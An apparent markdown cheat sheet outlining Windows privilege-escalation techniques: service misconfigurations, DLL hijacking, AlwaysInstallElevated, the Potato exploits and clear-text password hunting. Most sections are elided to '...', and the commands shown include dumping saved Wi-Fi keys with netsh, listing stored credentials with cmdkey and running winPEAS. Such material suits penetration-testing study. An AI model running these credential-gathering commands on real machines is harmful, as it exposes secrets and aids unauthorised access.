...
## <span style="color:#b31d36">Enumeration
...
## <span style="color:#b31d36">Service Exploits
...
1. DLL Hijacking
### <span style="color:#b31d36">Service Enumeration
...
```
### <span style="color:#b31d36">Listing All Running Services
```shell
...
net stop serv_name
```
### <span style="color:#b31d36">Exploit Insecure Services Permission
...
```
### <span style="color:#b31d36">Exploiting Unquoted Service Path
...
#### <span style="color:#b31d36"> Find Vulnerability
```shell
# Manually
...
```
#### <span style="color:#b31d36">Test If any directory is writable:
1. Manually
```shell
...
```
#### <span style="color:#b31d36">Exploit
...
```
#### <span style="color:#b31d36">Confirm Registry weak permission
```
...
net start SrvName
```
### <span style="color:#b31d36">DLL Hijacking
...
## <span style="color:#b31d36">Exploit Startup Program
...
```
## <span style="color:#b31d36">Exploiting AlwaysInstallElevated
...
```
## <span style="color:#b31d36">Exploiting Clear Text password
If we are in luck we may found password in clear text.

#### <span style="color:#b31d36">Finding WIFI password
```
netsh wlan show profile
netsh wlan show profile <SSID> key=clear
```
#### <span style="color:#b31d36">Search Sensitive Files that may have credential
```
cd C:\
...
```
#### <span style="color:#b31d36">Search for “Password"
```
...
```
#### <span style="color:#b31d36">Search Password in Registry
```
...
```
#### <span style="color:#b31d36">Try With Winpeas:
```
.\winPEAS.exe quiet filesinfo userinfo
```
## <span style="color:#b31d36">RunAS
Using cmdkey
```shell
cmdkey /list
...
```
## <span style="color:#b31d36">Exploiting Well known Software
...
```
## <span style="color:#b31d36">Schedule Task
```
#From CMD
...
### <span style="color:#b31d36">SeRestorePrivilege
This privilege grant a user to modify service binary, dll, also modify registry settings

### <span style="color:#b31d36">Others risky Privilege
* SeCreateTokenPrivilege
* SeLoadDriverPrivilege
* SeDebugPrivilege

## <span style="color:#b31d36">Hot Potato Exploit
...
```
## <span style="color:#b31d36">Juicy Potato
...
```
## <span style="color:#b31d36">Rogue Potato
...
## <span style="color:#b31d36">Useful Commands

### <span style="color:#b31d36">PowerUp
```powershell
...
```
### <span style="color:#b31d36">Port Forwarding
```shell
...
```
### <span style="color:#b31d36">BloodHound
```shell
